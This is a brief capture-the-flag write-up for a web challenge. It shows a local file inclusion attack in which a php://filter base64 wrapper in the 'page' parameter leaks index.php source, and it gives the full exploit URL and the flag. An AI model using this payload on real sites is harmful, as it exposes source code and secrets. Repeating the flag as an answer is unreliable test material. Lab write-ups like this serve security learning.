# Looking for the flag?

We can leak the source of index.php by [converting it to base64](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601). By going to `http://challenges.ringzer0team.com:10076/?page=php://filter/convert.base64-encode/resource=index.php` we get the source which we can convert to base64. Looking in the comments we get the flag.

Flag: FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J